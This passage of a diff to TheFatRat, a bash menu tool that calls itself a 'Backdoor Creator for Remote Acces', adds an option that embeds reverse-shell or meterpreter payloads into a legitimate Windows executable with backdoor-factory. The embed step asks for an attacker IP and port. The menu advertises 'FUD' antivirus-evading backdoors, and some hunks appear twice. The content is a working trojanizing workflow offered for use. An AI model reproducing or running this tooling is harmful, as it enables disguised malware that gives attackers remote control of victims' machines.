+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo -e $okegreen""
+				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
+                                echo -e "Shell Saved To output Folder "
+				clear
+				menu
+
+		elif test $fatrat == '5'
 			then
 			clisteners
 
-		elif test $fatrat == '5'
+		elif test $fatrat == '6'
  			then
  			xterm msfconsole
 
-		elif test $fatrat == '6'
+		elif test $fatrat == '7'
  			then
 			clear
  			echo -e "\033[31mWhat do you want to Hack Today?\033[m"
@@ -799,11 +1004,51 @@ echo
 			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
 			menu
 
-		elif test $fatrat == '7'
+		elif test $fatrat == '8'
+			then
+			echo ""
+			echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
+			read clean
+			if [ $clean == "y" ] ;
+				then
+			echo ""
+				else
+			clear
+			exit
+				fi
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/temp/"
+			cd temp
+			rm *.rc >/dev/null 2>&1
+			cd ..
+			sleep 2
+			echo ""
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/autorun/"
+			cd autorun
+			rm * >/dev/null 2>&1
+			cd ..
+			sleep 2
+			echo ""
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/output/"
+			cd output
+			rm * >/dev/null 2>&1
+			cd ..
+			sleep 2
+			echo ""
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/backdoored/output/"
+			cd backdoored/output
+			rm * >/dev/null 2>&1
+			cd .. 
+			cd ..
+			echo ""
+			echo -e $red"  [*] $cyan Folders cleaned, press any key to return to the main menu."
+			read anjeng
+			menu
+
+		elif test $fatrat == '9'
  			then
  			firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
 
- 		elif test $fatrat == '8'
+ 		elif test $fatrat == '10'
  			then
 			credits
  		else
@@ -811,7 +1056,7 @@ echo
 			fi
 			echo -n -e "  Do you want exit? ( Yes / No ) :"
 			read back
-			if [ $back != 'n' ] && [ $back != 'N' ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+			if [ $back != 'n' ] && [ $back != 'N' ]
 					then
 					clear
 					exit
@@ -834,10 +1079,10 @@ echo -e $okegreen"      .<     __O     $okegreen  | | |   | -_|   __| .'|  _|   
 echo -e $okegreen"     /\ \.-.' \      $okegreen  |_| |_|_|___|__|  |___|_| |__|__|___|_|  	"
 echo -e $okegreen"    J  \.|'.\/ \                  				"
 echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
-echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"	
-echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"1.4"              $white[$okegreen--$white]	"
-echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"Xenogenesis"      $white[$okegreen--$white]    "
-echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"	
+echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
+echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"             $white[$okegreen--$white]	"
+echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"            $white[$okegreen--$white]    "
+echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
 echo -e $okegreen"     |/         /   $white"[$okegreen--$white] $cyan"   				     $white[$okegreen--$white]		"
 echo -e $okegreen"       \      .'\.  $white"[$okegreen--$white]$white "    SELECT AN OPTION TO BEGIN:      $white[$okegreen--$white]  "
 echo -e $okegreen"    ____)_/\_(___\. $white"[$okegreen--$white] ".___________________________________$white[$okegreen--$white]	"
@@ -846,18 +1091,20 @@ echo
 
 
 		echo -e $white " "
-		echo -e $white"	[$okegreen"1"$white]$okegreen CREATE BACKDOOR WITH MSFVENOM "
-		echo -e $white"	[$okegreen"2"$white]$okegreen CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
-		echo -e $white"	[$okegreen"3"$white]$okegreen CREATE FUD BACKDOOR WITH AVOID 1.2  "
-		echo -e $white"	[$okegreen"4"$white]$okegreen CREATE A LISTENERS  "
-		echo -e $white"	[$okegreen"5"$white]$okegreen JUMP TO MSFCONSOLE  "
-		echo -e $white"	[$okegreen"6"$white]$okegreen SEARCHSPLOIT  "
-		echo -e $white"	[$okegreen"7"$white]$okegreen HELP  "
-		echo -e $white"	[$okegreen"8"$white]$okegreen CREDITS  "
+		echo -e $white"	[$okegreen"1"$white]$okegreen  CREATE BACKDOOR WITH MSFVENOM "
+		echo -e $white"	[$okegreen"2"$white]$okegreen  CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
+		echo -e $white"	[$okegreen"3"$white]$okegreen  CREATE FUD BACKDOOR WITH AVOID V1.2  "
+		echo -e $white"	[$okegreen"4"$white]$okegreen  CREATE FUD BACKDOOR WITH BACKDOOR-FACTORY  "
+		echo -e $white"	[$okegreen"5"$white]$okegreen  CREATE A LISTENERS  "
+		echo -e $white"	[$okegreen"6"$white]$okegreen  JUMP TO MSFCONSOLE  "
+		echo -e $white"	[$okegreen"7"$white]$okegreen  SEARCHSPLOIT  "
+		echo -e $white"	[$okegreen"8"$white]$okegreen  CLEANUP  "
+		echo -e $white"	[$okegreen"9"$white]$okegreen  HELP  "
+		echo -e $white"	[$okegreen"10"$white]$okegreen CREDITS  "
 		echo -e " "
 		echo -n -e $red'  \033[4mScreetsec@Fatrat:\033[0m '; tput sgr0 #insert your choice
 		read fatrat
-	
+
 		if test $fatrat == '1'
 			then
 			cmsfvenom
@@ -870,16 +1117,35 @@ echo
 		elif test $fatrat == '3'
 			then
 			avoid
-			
+
 		elif test $fatrat == '4'
+			then
+				echo ""
+				spinlong
+				echo ""
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/Download/Avast.exe) : ' embed
+				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
+				spinlong
+				echo ""
+				echo ""
+				gboor
+				spinlong2
+				echo ""
+				echo -e $okegreen""
+				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira
+                                echo -e "Shell Saved To output Folder "
+				clear
+				menu
+
+		elif test $fatrat == '5'
 			then
 			clisteners
 
-		elif test $fatrat == '5'
+		elif test $fatrat == '6'
  			then
  			xterm msfconsole
 
-		elif test $fatrat == '6'
+		elif test $fatrat == '7'
  			then
 			clear
  			echo -e "\033[31mWhat do you want to Hack Today?\033[m"
@@ -888,11 +1154,51 @@ echo
 			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
 			menu
 
-		elif test $fatrat == '7'
+		elif test $fatrat == '8'
+			then
+			echo ""
+			echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
+			read clean
+			if [ $clean == "y" ] ;
+				then
+			echo ""
+				else
+			clear
+			exit
+				fi
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/temp/"
+			cd temp
+			rm *.rc >/dev/null 2>&1
+			cd ..
+			sleep 2
+			echo ""
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/autorun/"
+			cd autorun
+			rm * >/dev/null 2>&1
+			cd ..
+			sleep 2
+			echo ""
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/output/"
+			cd output
+			rm * >/dev/null 2>&1
+			cd ..
+			sleep 2
+			echo ""
+			echo -e $red"  [*] $cyan Cleaning /TheFatRat/backdoored/output/"
+			cd backdoored/output
+			rm * >/dev/null 2>&1
+			cd .. 
+			cd ..
+			echo ""
+			echo -e $red"  [*] $cyan Folders cleaned, press any key to return to the main menu."
+			read anjeng
+			menu
+
+		elif test $fatrat == '9'
  			then
  			firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
 
- 		elif test $fatrat == '8'
+ 		elif test $fatrat == '10'
  			then
 			credits
  		else
@@ -900,7 +1206,7 @@ echo
 			fi
 			echo -n -e "  Do you want exit? ( Yes / No ) :"
 			read back
-			if [ $back != 'n' ] && [ $back != 'N' ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
+			if [ $back != 'n' ] && [ $back != 'N' ]
 					then
 					clear
 					exit
@@ -908,4 +1214,3 @@ echo
 					then
 					menu
 fi
-
